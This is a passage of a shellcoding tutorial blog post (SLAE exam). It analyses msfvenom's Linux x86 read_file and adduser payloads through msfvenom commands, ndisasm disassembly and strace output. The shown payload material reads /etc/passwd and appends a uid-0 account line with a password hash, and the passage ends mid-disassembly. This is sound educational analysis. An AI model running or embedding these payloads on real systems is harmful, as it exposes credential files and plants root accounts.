<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/grid.css type=text/css><link rel=stylesheet href=/css/highlight.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta name=twitter:title content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta itemprop=name content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta name=application-name content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2020-01-25T13:33:37Z"><meta property="article:published_time" content="2020-01-25T13:33:37Z"><base href=/www/slae-5-analysing_msfvenom/><link rel=canonical href=/www/slae-5-analysing_msfvenom/ itemprop=url><meta name=url content="/www/slae-5-analysing_msfvenom/"><meta name=twitter:url content="/www/slae-5-analysing_msfvenom/"><meta property="og:url" content="/www/slae-5-analysing_msfvenom/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Analysis of msfvenom generated shellcode"><meta itemprop=description content="Analysis of msfvenom generated shellcode"><meta property="og:description" content="Analysis of msfvenom generated shellcode"><meta name=twitter:description content="Analysis of msfvenom generated shellcode"><meta itemprop=image content="/img/hacker2.jpg"><meta property="og:image" content="/img/hacker2.jpg"><meta name=twitter:image content="/img/hacker2.jpg"><meta name=twitter:image:src content="/img/hacker2.jpg"><meta property="og:updated_time" content="2020-01-25T13:33:37Z"><link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml><title>dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom</title></head><body><div id=particles-js></div><main><div class=row><header class="col center"><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></div></div><div class=row><div class="col center"><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>SLAE 5: Analyzing shellcode generated by msfvenom</h1><br><p class=small style=color:#999><a href=/categories/programming>Programming</a> / January 25, 2020 â€¢ 15 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></p><br><p>In this article, I will analyse three shellcode samples generated by msfvenom, specifically:</p><ul><li>linux/x86/read_file</li><li>linux/x86/adduser</li><li>linux/x86/shell/reverse_tcp</li></ul><pre tabindex=0><code>msfvenom --list payloads -a x86 --platform linux
</code></pre><p>Let&rsquo;s see if there is something new we can learn from these samples :)</p><h2 id=analyzing-linuxx86read_file>Analyzing linux/x86/read_file</h2><p>First, we generate the executable like so:</p><pre tabindex=0><code>msfvenom -p linux/x86/read_file -a x86 --platform linux PATH=/etc/passwd FD=2 -f elf -o read_file
</code></pre><p>I set the payload options <code>PATH</code> and <code>FD</code> to <code>/etc/passwd</code> and <code>2</code>. Executing the program outputs the contents of <code>/etc/passwd</code>.</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ ./read_file
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
...
</code></pre><p>Now that we know that the payload works, we can start analyzing it using a few simple tools.</p><p>With <code>ndisasm</code> we can disassemble the binary and analyze the assembly code.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>dubs3c@slae:</span><span class=err>~/</span><span class=nf>SLAE</span><span class=err>/</span><span class=no>EXAM</span><span class=err>/</span><span class=no>github</span><span class=err>/</span><span class=no>assignment_5$</span> <span class=no>msfvenom</span> <span class=p>-</span><span class=no>p</span> <span class=no>linux</span><span class=err>/</span><span class=no>x86</span><span class=err>/</span><span class=no>read_file</span> <span class=p>-</span><span class=no>a</span> <span class=no>x86</span> <span class=p>--</span><span class=no>platform</span> <span class=no>linux</span> <span class=no>PATH</span><span class=err>=/</span><span class=no>etc</span><span class=err>/</span><span class=no>passwd</span> <span class=no>FD</span><span class=err>=</span><span class=mi>2</span> <span class=p>-</span><span class=no>f</span> <span class=no>raw</span> <span class=err>|</span> <span class=no>ndisasm</span> <span class=p>-</span><span class=no>u</span> <span class=p>-</span>
</span></span><span class=line><span class=cl><span class=nf>No</span> <span class=no>encoder</span> <span class=no>specified</span><span class=p>,</span> <span class=no>outputting</span> <span class=no>raw</span> <span class=no>payload</span>
</span></span><span class=line><span class=cl><span class=nf>Payload</span> <span class=no>size</span><span class=p>:</span> <span class=mi>73</span> <span class=no>bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>00000000</span>  <span class=nf>EB36</span>              <span class=no>jmp</span> <span class=no>short</span> <span class=mi>0x38</span>
</span></span><span class=line><span class=cl><span class=err>00000002</span>  <span class=nf>B805000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x5</span>
</span></span><span class=line><span class=cl><span class=err>00000007</span>  <span class=err>5</span><span class=nf>B</span>                <span class=no>pop</span> <span class=no>ebx</span>
</span></span><span class=line><span class=cl><span class=err>00000008</span>  <span class=err>31</span><span class=nf>C9</span>              <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>0000000</span><span class=nf>A</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=err>0000000</span><span class=nf>C</span>  <span class=mi>89</span><span class=no>C3</span>              <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>0000000</span><span class=nf>E</span>  <span class=no>B803000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x3</span>
</span></span><span class=line><span class=cl><span class=err>00000013</span>  <span class=err>89</span><span class=nf>E7</span>              <span class=no>mov</span> <span class=no>edi</span><span class=p>,</span><span class=no>esp</span>
</span></span><span class=line><span class=cl><span class=err>00000015</span>  <span class=err>89</span><span class=nf>F9</span>              <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>edi</span>
</span></span><span class=line><span class=cl><span class=err>00000017</span>  <span class=nf>BA00100000</span>        <span class=no>mov</span> <span class=no>edx</span><span class=p>,</span><span class=mi>0x1000</span>
</span></span><span class=line><span class=cl><span class=err>0000001</span><span class=nf>C</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=err>0000001</span><span class=nf>E</span>  <span class=mi>89</span><span class=no>C2</span>              <span class=no>mov</span> <span class=no>edx</span><span class=p>,</span><span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>00000020</span>  <span class=nf>B804000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x4</span>
</span></span><span class=line><span class=cl><span class=err>00000025</span>  <span class=nf>BB02000000</span>        <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=mi>0x2</span>
</span></span><span class=line><span class=cl><span class=err>0000002</span><span class=nf>A</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=err>0000002</span><span class=nf>C</span>  <span class=no>B801000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x1</span>
</span></span><span class=line><span class=cl><span class=err>00000031</span>  <span class=nf>BB00000000</span>        <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=mi>0x0</span>
</span></span><span class=line><span class=cl><span class=err>00000036</span>  <span class=nf>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=err>00000038</span>  <span class=nf>E8C5FFFFFF</span>        <span class=no>call</span> <span class=no>dword</span> <span class=mi>0x2</span>
</span></span><span class=line><span class=cl><span class=err>0000003</span><span class=nf>D</span>  <span class=mi>2</span><span class=no>F</span>                <span class=no>das</span>
</span></span><span class=line><span class=cl><span class=err>0000003</span><span class=nf>E</span>  <span class=mi>657463</span>            <span class=no>gs</span> <span class=no>jz</span> <span class=mi>0xa4</span>
</span></span><span class=line><span class=cl><span class=err>00000041</span>  <span class=err>2</span><span class=nf>F</span>                <span class=no>das</span>
</span></span><span class=line><span class=cl><span class=err>00000042</span>  <span class=err>7061</span>              <span class=nf>jo</span> <span class=mi>0xa5</span>
</span></span><span class=line><span class=cl><span class=err>00000044</span>  <span class=err>7373</span>              <span class=nf>jnc</span> <span class=mi>0xb9</span>
</span></span><span class=line><span class=cl><span class=err>00000046</span>  <span class=err>7764</span>              <span class=nf>ja</span> <span class=mi>0xac</span>
</span></span><span class=line><span class=cl><span class=err>00000048</span>  <span class=err>00</span>                <span class=nf>db</span> <span class=mi>0x00</span>
</span></span></code></pre></td></tr></table></div></div><p>Looking at the assembly output we can immediately recognize kernel interrupt instructions <em>(int x80)</em>, meaning the program is making use of syscalls. The specific syscall being called is often defined in <code>eax</code> and any arguments are placed in <code>ebx, ecx, edx</code>.</p><p>The first instruction is a jump to <code>0x38</code>, following the jump to address <code>00000038</code> we see that the next instruction is <code>call dword 0x2</code>. A <code>call</code> instruction will push the address of the next instruction to the stack. The call takes us back to the beginning of the shellcode, next instruction is <code>mov eax, 0x5</code> at address <code>00000002</code>. Placing <code>0x5</code> in <code>eax</code> specifies which syscall to execute. Checking in <code>usr/include/i386-linux-gnu/asm/unistd_32.h</code> which syscall corresponds to <code>0x5</code> returned:</p><pre tabindex=0><code>#define __NR_restart_syscall 0
#define __NR_exit 1
#define __NR_fork 2
#define __NR_read 3
#define __NR_write 4
#define __NR_open 5
#define __NR_close 6
#define __NR_waitpid 7
#define __NR_creat 8
#define __NR_link 9
#define __NR_unlink 10
...
</code></pre><p>The syscall is <code>__NR_open 5</code>. Running <code>man 2 open</code> reveals the following syntax for open:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>[...]</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>open</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>pathname</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>open</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>pathname</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=n>mode_t</span> <span class=n>mode</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>[...]</span>
</span></span></code></pre></td></tr></table></div></div><p>The first argument is the file path, next two arguments are flags and which mode that should be used. The <code>pop ebx</code> instruction pops the address on top of the stack into the <code>ebx</code> register. Now what does this address point to? Well, let&rsquo;s check what the hex values after the call instruction converts to:</p><pre tabindex=0><code>2F 657463 2F 7061 7373 7764 00 = /etc/passwd\0
</code></pre><p>The file that we want to open :)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>00000002</span>  <span class=nf>B805000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x5</span>     <span class=c>; open() syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000007</span>  <span class=mi>5</span><span class=no>B</span>                <span class=no>pop</span> <span class=no>ebx</span>         <span class=c>; filepath to open
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000008</span>  <span class=mi>31</span><span class=no>C9</span>              <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>     <span class=c>; zero
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000000</span><span class=no>A</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>        <span class=c>; execute syscall
</span></span></span></code></pre></td></tr></table></div></div><p>The next argument (flags) is 0 because <code>xor ecx, ecx</code> returns zero. Finally the syscall is executed and the result is stored in <code>eax</code>, which is a file descriptor.</p><p>Next section actually reads the contents of the file. This is done by moving the previous result (the file descriptor) into <code>ebx</code> which is the first argument for the READ syscall. <code>0x3</code> which corresponds to the <code>read()</code> syscall, is placed in <code>eax</code>. <code>ecx</code> contains the address where the contents will be stored, while <code>edx</code> indicates how many bytes to read, which is this case is 4096 (0x1000). <code>READ</code> will return the number of bytes read into <code>eax</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>0000000</span><span class=nf>C</span>  <span class=mi>89</span><span class=no>C3</span>              <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>eax</span>         <span class=c>; FD from open()
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000000</span><span class=no>E</span>  <span class=no>B803000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x3</span>         <span class=c>; read() syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000013</span>  <span class=mi>89</span><span class=no>E7</span>              <span class=no>mov</span> <span class=no>edi</span><span class=p>,</span><span class=no>esp</span>
</span></span><span class=line><span class=cl><span class=err>00000015</span>  <span class=err>89</span><span class=nf>F9</span>              <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>edi</span>         <span class=c>; where to store contents
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000017</span>  <span class=no>BA00100000</span>        <span class=no>mov</span> <span class=no>edx</span><span class=p>,</span><span class=mi>0x1000</span>      <span class=c>; read 4096 bytes
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000001</span><span class=no>C</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
</span></span></span></code></pre></td></tr></table></div></div><p>The final section writes the contents to <code>STDOUT</code> and then exits the program. The first four instructions sets up the <code>write()</code> syscall by placing <code>0x4</code> into <code>eax</code>, setting the first argument to <code>0x2</code> which is STDOUT and finally sets how many bytes to write in <code>edx</code>. The following three instructions simply exits the program by setting <code>eax</code> to the EXIT syscall.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>0000001</span><span class=nf>E</span>  <span class=mi>89</span><span class=no>C2</span>              <span class=no>mov</span> <span class=no>edx</span><span class=p>,</span><span class=no>eax</span>         <span class=c>; bytes read from read() syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000020</span>  <span class=no>B804000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x4</span>         <span class=c>; write() syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000025</span>  <span class=no>BB02000000</span>        <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=mi>0x2</span>         <span class=c>; write to STDOUT
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000002</span><span class=no>A</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000002</span><span class=no>C</span>  <span class=no>B801000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x1</span>         <span class=c>; exit() syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000031</span>  <span class=no>BB00000000</span>        <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=mi>0x0</span>         <span class=c>; no error
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000036</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
</span></span></span></code></pre></td></tr></table></div></div><p>You can also inspect the binary by running it with <code>strace</code>, which shows you all the functions invocations and values:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ strace ./read_file
execve(&#34;./read_file&#34;, [&#34;./read_file&#34;], [/* 22 vars */]) = 0
open(&#34;/etc/passwd&#34;, O_RDONLY)           = 3
read(3, &#34;root:x:0:0:root:/root:/bin/bash\n&#34;..., 4096) = 1888
write(2, &#34;root:x:0:0:root:/root:/bin/bash\n&#34;..., 1888root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
[...]
</code></pre><p>Now we have finished analyzing the first shellcode created by msfvenom, let&rsquo;s move on to the next one!</p><h2 id=linuxx86adduser>linux/x86/adduser</h2><p>Next payload generated by <code>msfvenom</code> is the <code>adduser</code> shellcode. Let&rsquo;s start by examining the first five instructions.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>00000000</span>  <span class=err>31</span><span class=nf>C9</span>              <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>00000002</span>  <span class=err>89</span><span class=nf>CB</span>              <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>00000004</span>  <span class=err>6</span><span class=nf>A46</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x46</span>
</span></span><span class=line><span class=cl><span class=err>00000006</span>  <span class=err>58</span>                <span class=nf>pop</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>00000007</span>  <span class=nf>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=err>00000009</span>  <span class=err>6</span><span class=nf>A05</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x5</span>
</span></span><span class=line><span class=cl><span class=err>0000000</span><span class=nf>B</span>  <span class=mi>58</span>                <span class=no>pop</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>0000000</span><span class=nf>C</span>  <span class=mi>31</span><span class=no>C9</span>              <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>0000000</span><span class=nf>E</span>  <span class=mi>51</span>                <span class=no>push</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>0000000</span><span class=nf>F</span>  <span class=mi>6873737764</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0x64777373</span>
</span></span><span class=line><span class=cl><span class=err>00000014</span>  <span class=err>682</span><span class=nf>F2F7061</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0x61702f2f</span>
</span></span><span class=line><span class=cl><span class=err>00000019</span>  <span class=err>682</span><span class=nf>F657463</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0x6374652f</span>
</span></span><span class=line><span class=cl><span class=err>0000001</span><span class=nf>E</span>  <span class=mi>89</span><span class=no>E3</span>              <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>
</span></span><span class=line><span class=cl><span class=err>00000020</span>  <span class=err>41</span>                <span class=nf>inc</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>00000021</span>  <span class=nf>B504</span>              <span class=no>mov</span> <span class=no>ch</span><span class=p>,</span><span class=mi>0x4</span>
</span></span><span class=line><span class=cl><span class=err>00000023</span>  <span class=nf>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=err>00000025</span>  <span class=err>93</span>                <span class=nf>xchg</span> <span class=no>eax</span><span class=p>,</span><span class=no>ebx</span>
</span></span><span class=line><span class=cl><span class=err>00000026</span>  <span class=nf>E828000000</span>        <span class=no>call</span> <span class=no>dword</span> <span class=mi>0x53</span>
</span></span><span class=line><span class=cl><span class=err>0000002</span><span class=nf>B</span>  <span class=mi>6</span><span class=no>D</span>                <span class=no>insd</span>
</span></span><span class=line><span class=cl><span class=err>0000002</span><span class=nf>C</span>  <span class=mi>657461</span>            <span class=no>gs</span> <span class=no>jz</span> <span class=mi>0x90</span>
</span></span><span class=line><span class=cl><span class=err>0000002</span><span class=nf>F</span>  <span class=mi>7370</span>              <span class=no>jnc</span> <span class=mi>0xa1</span>
</span></span><span class=line><span class=cl><span class=err>00000031</span>  <span class=err>6</span><span class=nf>C</span>                <span class=no>insb</span>
</span></span><span class=line><span class=cl><span class=err>00000032</span>  <span class=err>6</span><span class=nf>F</span>                <span class=no>outsd</span>
</span></span><span class=line><span class=cl><span class=err>00000033</span>  <span class=err>69743</span><span class=nf>A417A2F6449</span>  <span class=no>imul</span> <span class=no>esi</span><span class=p>,[</span><span class=no>edx</span><span class=err>+</span><span class=no>edi</span><span class=err>+</span><span class=mi>0x41</span><span class=p>],</span><span class=no>dword</span> <span class=mi>0x49642f7a</span>
</span></span><span class=line><span class=cl><span class=err>0000003</span><span class=nf>B</span>  <span class=mi>736</span><span class=no>A</span>              <span class=no>jnc</span> <span class=mi>0xa7</span>
</span></span><span class=line><span class=cl><span class=err>0000003</span><span class=nf>D</span>  <span class=mi>3470</span>              <span class=no>xor</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x70</span>
</span></span><span class=line><span class=cl><span class=err>0000003</span><span class=nf>F</span>  <span class=mi>3449</span>              <span class=no>xor</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x49</span>
</span></span><span class=line><span class=cl><span class=err>00000041</span>  <span class=err>52</span>                <span class=nf>push</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=err>00000042</span>  <span class=err>633</span><span class=nf>A</span>              <span class=no>arpl</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>di</span>
</span></span><span class=line><span class=cl><span class=err>00000044</span>  <span class=err>303</span><span class=nf>A</span>              <span class=no>xor</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>bh</span>
</span></span><span class=line><span class=cl><span class=err>00000046</span>  <span class=err>303</span><span class=nf>A</span>              <span class=no>xor</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>bh</span>
</span></span><span class=line><span class=cl><span class=err>00000048</span>  <span class=err>3</span><span class=nf>A2F</span>              <span class=no>cmp</span> <span class=no>ch</span><span class=p>,[</span><span class=no>edi</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>0000004</span><span class=nf>A</span>  <span class=mi>3</span><span class=no>A2F</span>              <span class=no>cmp</span> <span class=no>ch</span><span class=p>,[</span><span class=no>edi</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>0000004</span><span class=nf>C</span>  <span class=mi>62696</span><span class=no>E</span>            <span class=no>bound</span> <span class=no>ebp</span><span class=p>,[</span><span class=no>ecx</span><span class=err>+</span><span class=mi>0x6e</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>0000004</span><span class=nf>F</span>  <span class=mi>2</span><span class=no>F</span>                <span class=no>das</span>
</span></span><span class=line><span class=cl><span class=err>00000050</span>  <span class=err>7368</span>              <span class=nf>jnc</span> <span class=mi>0xba</span>
</span></span><span class=line><span class=cl><span class=err>00000052</span>  <span class=err>0</span><span class=nf>A598B</span>            <span class=no>or</span> <span class=no>bl</span><span class=p>,[</span><span class=no>ecx-0x75</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>00000055</span>  <span class=err>51</span>                <span class=nf>push</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>00000056</span>  <span class=nf>FC</span>                <span class=no>cld</span>
</span></span><span class=line><span class=cl><span class=err>00000057</span>  <span class=err>6</span><span class=nf>A04</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x4</span>
</span></span><span class=line><span class=cl><span class=err>00000059</span>  <span class=err>58</span>                <span class=nf>pop</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>0000005</span><span class=nf>A</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=err>0000005</span><span class=nf>C</span>  <span class=mi>6</span><span class=no>A01</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x1</span>
</span></span><span class=line><span class=cl><span class=err>0000005</span><span class=nf>E</span>  <span class=mi>58</span>                <span class=no>pop</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>0000005</span><span class=nf>F</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span></code></pre></td></tr></table></div></div><p>We can see that the last instruction is a kernel interrupt instruction, indicating that a syscall is going be made. The syscall number is placed in <code>eax</code>. The value is 0x46 which first pushed onto the stack, which is immediately poped into <code>eax</code>. By looking in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> we can see which syscall corresponds to <code>46</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>00000000</span>  <span class=err>31</span><span class=nf>C9</span>              <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>         <span class=c>; zero out ecx
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000002</span>  <span class=mi>89</span><span class=no>CB</span>              <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>ecx</span>         <span class=c>; ebx is now zero
